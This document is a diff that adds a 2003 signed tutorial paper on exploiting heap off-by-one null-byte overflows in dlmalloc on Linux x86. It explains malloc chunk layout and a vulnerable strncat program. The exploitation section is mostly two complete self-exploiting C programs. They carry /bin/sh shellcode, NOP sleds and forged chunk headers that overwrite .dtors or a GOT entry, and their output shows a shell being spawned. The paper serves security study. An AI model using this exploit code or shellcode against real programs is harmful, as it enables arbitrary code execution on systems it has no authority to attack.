@@ -1,0 +1,451 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Heap off by one
+
+by qitest1 <qitest1@bespin.org>
+http://bespin.org/~qitest1
+GPG public key: http://bespin.org/~qitest1/qitest1.gpg.key
+
+Copyright (c) 2003 qitest1
+
+1. Disclaimer
+Information contained within this paper is provided for educational purposes only.
+You may freely redistribute or republish this paper, provided the following conditions 
+are met: the paper is left intact; proper credit is given to its author.
+You are free to rewrite your own articles based on this material (assuming the above  
+conditions are met). It would also be appreciated if an e-mail is sent to me to let me 
+know you are going to be republishing this paper or writing an article based upon one of 
+my ideas.
+
+2. Introduction
+The scope of this short paper is to describe how vulnerabilities consisting in a null byte 
+written past the end of dinamically allocated buffers could be exploited.
+The name 'off by one' is borrowed from the well known category of vulnerabilities affecting 
+buffers allocated onto the stack: in that case exploitation is performed through the frame 
+pointer overwrite. See references in the end for details [1][2].
+Exploitation of this kind of vulnerability for buffers allocated onto the heap meets a 
+completely different context.
+In this paper I will refer to Linux x86, but a lot of the things described here are 
+applicable to other systems as well.
+
+3. Overview of malloc chunk
+First of all we have to know what is a malloc chunk, or at least how it looks like, 
+taking a look to malloc.c (dlmalloc):
+
+struct malloc_chunk {
+  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+};
+
+prev_size and size fields constitute the chunk header.
+On the contrary fd and bk fields are used only if chunk is free. When in use, this is just 
+the beginning of our memory area. malloc() returns a pointer to that area.
+See references in the end for further details about malloc() and typical exploitation of 
+heap overflows [3][4][5].
+
+4. Length and allocation
+When malloc() is called, it doesn't allocate the exact number of bytes passed as argument.
+Take a look to the following code:
+
+<alloc.c>
+int
+main(int argc, char **argv)
+{
+	char	*p0, *p1;
+	int	*size_p, len;
+
+	if(argc == 1)
+		exit(1);
+
+	len = atoi(argv[1]);
+
+	p0 = (char *) malloc(len);
+	p1 = (char *) malloc(8);
+	printf("p0 -> %p\n", p0);
+	printf("p1 -> %p\n", p1);
+
+	size_p = (int *) p0 - 1;
+	printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+	size_p = (int *) p1 - 1;
+	printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+	free(p0);
+	free(p1);
+}
+</alloc.c>
+
+Let's see how chunk size is set:
+
+bash-2.05a$ ./alloc 4
+p0 -> 0x80497d8
+p1 -> 0x80497e8
+allocated size for p0: 17 (0x11)
+allocated size for p1: 17 (0x11)
+bash-2.05a$ ./alloc 8
+p0 -> 0x80497d8
+p1 -> 0x80497e8
+allocated size for p0: 17 (0x11)
+allocated size for p1: 17 (0x11)
+bash-2.05a$ ./alloc 12
+p0 -> 0x80497d8
+p1 -> 0x80497e8
+allocated size for p0: 17 (0x11)
+allocated size for p1: 17 (0x11)
+bash-2.05a$ ./alloc 13
+p0 -> 0x80497d8
+p1 -> 0x80497f0
+allocated size for p0: 25 (0x19)
+allocated size for p1: 17 (0x11)
+
+0x11 is the minimal allocation. It says 0x11 and not 0x10 because the low bit of the length 
+is a flag: 0 == free, 1 == in use.
+You can see that at a certain point a larger area is allocated.
+
+Let's explain better this point:
+
+p0 -> 0x8049928
+p1 -> 0x8049938
+allocated size for p0: 17 (0x11)
+allocated size for p1: 17 (0x11)
+
+(gdb) x/8 0x8049928 - 8
+0x8049920:      0x00000000      0x00000011      0x41414141      0x00414141
+0x8049930:      0x00000000      0x00000011      0x00000000      0x00000000
+(gdb) x 0x8049928 + 12
+0x8049934:      0x00000011
+
+This clearly shows that size includes next chunk header.
+If we are able to put a null byte beyond the end of the first buffer, with a carefully 
+calculated length we can set to zero the size field of another chunk allocated immediately 
+past ours. 
+Length can be calculated this way:
+
+	length = 12 + (n * 8);
+
+12, 20, 28, 36 ...
+
+Take a look to the following vulnerable program. Length allocated does not include the 
+terminator of string. What do we use to write off by one? For example strncat(): it always 
+null-terminates, but even off by one.
+
+<vuln.c>
+#define	MY_LEN	12
+
+void
+do_it(char *s)
+{
+        char    *p0, *p1;
+        int     *size_p, len;
+
+        len = strlen(s);
+	printf("len: %u\n", len);
+
+        p0 = (char *) malloc(len);
+        p1 = (char *) malloc(8);
+        printf("p0 -> %p\n", p0);
+        printf("p1 -> %p\n", p1);
+
+        size_p = (int *) p0 - 1;
+        printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+        size_p = (int *) p1 - 1;
+        printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+	p0[0] = 0x00;
+        strncat(p0, s, len);
+
+        size_p = (int *) p0 - 1;
+        printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+        size_p = (int *) p1 - 1;
+        printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+        free(p0);
+        free(p1);
+
+	return;
+}
+
+int
+main()
+{
+	char	s[256];
+
+	memset(s, 0x41, MY_LEN);
+	s[MY_LEN] = 0x00;
+
+	do_it(s);
+
+	exit(0);
+}
+</vuln.c>
+
+bash-2.05a$ ./vuln
+len: 12
+p0 -> 0x8049900
+p1 -> 0x8049910
+allocated size for p0: 17 (0x11)
+allocated size for p1: 17 (0x11)
+allocated size for p0: 17 (0x11)
+allocated size for p1: 0 ((nil))
+Segmentation fault
+
+Now it's time to look for a way to get control of the program flow.
+
+5. Exploitation
+size field setted to zero means that chunk is not in use. When free() is called on this 
+chunk, it will look for previous and next chunk in order to link them each other. We 
+provide those addresses.
+The following program exploits itself. LOCATION points to .dtors, but of course it could 
+be also the __free_hook address or whatever you wish. 
+To find .dtors: objdump -s -j .dtors <program>. Then increase the first address on the 
+left by 0x4. To find the shellcode address launch the program. Shellcode is at the address 
+of the first buffer (p0) + 0x20 (I had p0 pointing to 0x8049b08). 
+
+<auto-xpl.c>
+#define	LOCATION	0x8049aa8
+#define SC_ADDR		0x8049b28
+
+	/* Linux x86 PIC basic shellcode (25 bytes) */
+        char   shellcode[] =
+        "\x31\xc0\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f"
+        "\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
+        "\x80";
+
+void
+do_it(char *s0, char *s1)
+{
+        char    *p0, *p1;
+        int     *size_p, len0, len1;
+
+        len0 = strlen(s0);
+	printf("len0: %u\n", len0);
+        len1 = strlen(s1);
+        printf("len1: %u\n", len1);
+
+        p0 = (char *) malloc(len0);
+        p1 = (char *) malloc(len1);
+        printf("p0 -> %p\n", p0);
+        printf("p1 -> %p\n", p1);
+
+        size_p = (int *) p0 - 1;
+        printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+        size_p = (int *) p1 - 1;
+        printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+	p0[0] = 0x00;
+        strncat(p0, s0, len0);
+	memcpy(p1, s1, len1);
+
+        size_p = (int *) p0 - 1;
+        printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+        size_p = (int *) p1 - 1;
+        printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+        free(p0);
+        free(p1);
+
+	return;
+}
+
+int
+main()
+{
+	char	s0[1024], s1[1024];
+	int	*i;
+
+        i = (int *) s0;
+	*i++ = 0x41414141;
+	*i++ = 0x41414141;
+        *i++ = 0xadadadad;
+        *i++ = 0x00;
+
+	memset(s1, 0x00, sizeof(s1));
+
+        i = (int *) s1;
+	*i++ = LOCATION - 12;
+	*i++ = SC_ADDR - 8;
+	memset(s1 + strlen(s1), 0x90, 4);
+	memcpy(s1 + strlen(s1), "\xeb\x0e\x90\x90", 4);
+	memset(s1 + strlen(s1), 0x90, 24);
+	memcpy(s1 + strlen(s1), shellcode, strlen(shellcode) + 1);
+
+	do_it(s0, s1);
+
+	exit(0);
+}
+</auto-xpl.c>
+
+bash-2.05a$ ./auto-xpl
+len0: 12
+len1: 65
+p0 -> 0x8049b08
+p1 -> 0x8049b18
+allocated size for p0: 17 (0x11)
+allocated size for p1: 73 (0x49)
+allocated size for p0: 17 (0x11)
+allocated size for p1: 0 ((nil))
+sh-2.05a$
+
+The solution illustrated above has a big disadvantage: we need to control the first 8 bytes 
+of the buffer whose size is set to zero, and this is improbable (even if not impossible) in 
+real life.
+We need another idea.
+Since we control the prev_size field, we could set it to a positive value (i.e.: 0x00000010), 
+thus making free() to look for previous chunk inside the first buffer, where we could put our 
+special malloc structure. From a certain point of view this is a good solution, because it needs 
+only one buffer reachable by our input. From another point of view it is not, because that value 
+contains null bytes, and in most cases we are not able to write them (i.e.: strcpy()).
+The remaining solution is to set the prev_size field to a negative value (i.e.: 0xfffffff0):
+free() will look for previous chunk somewhere past the end of the buffer we control.
+This method allow us to write an arbitrary value in an arbitrary location: we put a fake 
+malloc structure in the location pointed to by the negative prev_size.
+Nevertheless, after that it segfaults.
+This is generally not a problem in real programs, such as network daemons, because they 
+always have signal handlers: if we patch the GOT entry of one of the functions called in the 
+SIGSEGV handler (i.e.: syslog()), we can still control the program flow. 
+The following program exploits itself. LOCATION points to the GOT entry of printf().
+To find it: 
+(gdb) x/i printf
+0x8048484 <printf>:     jmp    *0x8049be4
+				^^^^^^^^^
+To find the shellcode address launch the program. Shellcode is at the address
+of the first buffer (p0) + 0x38 (I had p0 pointing to 0x8049c20).
+
+<auto-xpl-negsiz.c>
+#include <signal.h>
+
+#define	LOCATION	0x8049be4
+#define SC_ADDR		0x8049c58
+
+	/* Linux x86 PIC basic shellcode (25 bytes) */
+        char   shellcode[] =
+        "\x31\xc0\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f"
+        "\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
+        "\x80";
+
+void
+sigsegvhandler()
+{
+        printf("Caught SIGSEGV.\n");
+
+	exit(1);
+}
+
+void
+do_it(char *s0, char *s1)
+{
+        char    *p0, *p1;
+        int     *size_p, len0, len1;
+
+        len0 = strlen(s0);
+	printf("len0: %u\n", len0);
+        len1 = strlen(s1);
+        printf("len1: %u\n", len1);
+
+        p0 = (char *) malloc(len0);
+        p1 = (char *) malloc(len1);
+        printf("p0 -> %p\n", p0);
+        printf("p1 -> %p\n", p1);
+
+        size_p = (int *) p0 - 1;
+        printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+        size_p = (int *) p1 - 1;
+        printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+	p0[0] = 0x00;
+        strncat(p0, s0, len0);
+	memcpy(p1, s1, len1);
+
+        size_p = (int *) p0 - 1;
+        printf("allocated size for p0: %u (%p)\n", *size_p, *size_p);
+        size_p = (int *) p1 - 1;
+        printf("allocated size for p1: %u (%p)\n", *size_p, *size_p);
+
+        free(p1);
+
+	return;
+}
+
+int
+main()
+{
+	char	s0[1024], s1[1024], zbuf[1024];
+	int	*i;
+
+	signal(SIGSEGV, sigsegvhandler);
+
+        i = (int *) s0;
+	*i++ = 0x41414141;
+	*i++ = 0x41414141;
+        *i++ = 0xffffffe0;
+        *i++ = 0x00;
+
+	memset(zbuf, 0x00, sizeof(zbuf));
+	memset(zbuf, 0x41, 9);
+	i = (int *) &zbuf[strlen(zbuf)];
+	*i++ = 0xfffffffe;
+	*i++ = 0xffffffff;
+	*i++ = LOCATION - 12;
+	*i++ = SC_ADDR;
+
+	memset(zbuf + strlen(zbuf), 0x90, 4);
+	memcpy(zbuf + strlen(zbuf), "\xeb\x08\x90\x90", 4);
+	memset(zbuf + strlen(zbuf), 0x90, 24);
+	memcpy(zbuf + strlen(zbuf), shellcode, strlen(shellcode) + 1);
+
+	snprintf(s1, sizeof(s1), "Your input is: %s\n", zbuf);
+
+	do_it(s0, s1);
+
+	exit(0);
+}
+</auto-xpl-negsiz.c>
+
+bash-2.05a$ ./auto-xpl-negsiz
+len0: 12
+len1: 98
+p0 -> 0x8049c20
+p1 -> 0x8049c30
+allocated size for p0: 17 (0x11)
+allocated size for p1: 105 (0x69)
+allocated size for p0: 17 (0x11)
+allocated size for p1: 0 ((nil))
+sh-2.05a$
+
+6. Conclusion
+Conceptually this technique is not very different from the general method used to exploit heap 
+overflows.
+Surely this vulnerability is not common in real life code. But you have to think to poorly 
+written utility functions for string management, or to cases where calculation of length to 
+allocate is not so intuitive as in my example. Anyway this is beyond the scope of this paper. 
+
+7. Author's note
+Sorry for my poor English. :\
+
+8. References
+
+[1] klog. The Frame Pointer Overwrite
+http://www.phrack.com/search.phtml?view&article=p55-8
+
+[2] qitest1. middleman-1.2 and prior off-by-one bug
+http://bespin.org/~qitest1/adv/middleman-1.2.txt.asc
+
+[3] Doug Lea malloc.c (aka dlmalloc)
+ftp://gee.cs.oswego.edu/pub/misc/malloc.c
+
+[4] maxx. Vudo malloc tricks
+http://www.phrack.com/search.phtml?view&article=p57-8
+
+[5] anonymous. Once upon a free()
+http://www.phrack.com/search.phtml?view&article=p57-9
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.6 (GNU/Linux)
+Comment: For info see http://www.gnupg.org
+
+iD8DBQE+8M+VIrsshIyVmPkRAmCVAJ9TIccur1MLmPF5WExVwpPIx6CWCwCdGvdN
+bPI0xkMbrktc3pow1h1ox78=
+=RrN3
+-----END PGP SIGNATURE-----
